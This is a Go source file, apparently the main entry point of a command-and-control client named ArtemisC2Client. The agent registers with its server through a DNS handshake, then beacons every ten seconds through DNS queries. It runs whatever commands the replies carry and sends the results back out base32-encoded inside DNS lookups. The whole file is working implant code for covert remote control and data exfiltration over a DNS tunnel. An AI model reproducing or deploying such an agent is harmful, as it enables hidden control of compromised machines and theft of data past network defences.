package main

import (
	"fmt"
	"strings"
	"time"

	"github.com/desertcod98/ArtemisC2Client/commands"
	"github.com/desertcod98/ArtemisC2Client/dns"
	"github.com/desertcod98/ArtemisC2Client/encoding"
	"github.com/desertcod98/ArtemisC2Client/config"
)

func main() {
	cfg, configErr := config.LoadConfig()

	if(configErr != nil){
		agentId, handshakeErr := doHandshake()
		if(handshakeErr != nil){
			fmt.Println("Handshake error:", handshakeErr)
			return
		}
		cfg.AgentId = agentId
		cfg.BeaconInterval = 10 // seconds
		config.SaveConfig(cfg)
	}
	
	agentId := cfg.AgentId
	beaconInterval := cfg.BeaconInterval

	fmt.Println("Agent id:", agentId)

	ticker := time.NewTicker(time.Duration(beaconInterval) * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		beaconRes, beaconErr := dns.DnsQuery(agentId + ".Beacon")
		if beaconErr != nil {
			fmt.Println("Error:", beaconErr)
			return
		}
		fmt.Println("Beacon response:", beaconRes)

		commandSplit := strings.Split(beaconRes, ".")
		if len(commandSplit) < 2 {
			continue
		}

		reverseStringArr(commandSplit)
		job := commandSplit[0]
		commandType := commandSplit[1]
		commandArgs := commandSplit[2:]

		if cmd, ok := commands.Dispatcher[strings.ToLower(commandType)]; ok {
			resultChan := cmd.Execute(commandArgs)
			result := <-resultChan
			dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
		}
	}
}

func doHandshake() (string, error) {
	var agentId string
	handshakeRes, handshakeErr := dns.DnsQuery("handshake")
	if handshakeErr != nil {
		return agentId, handshakeErr
	}
	fmt.Println("Handhsake job id:", handshakeRes)

	return dns.DnsQuery(handshakeRes)
}

func reverseStringArr(input []string) {
	for i, j := 0, len(input)-1; i < j; i, j = i+1, j-1 {
		input[i], input[j] = input[j], input[i]
	}
}
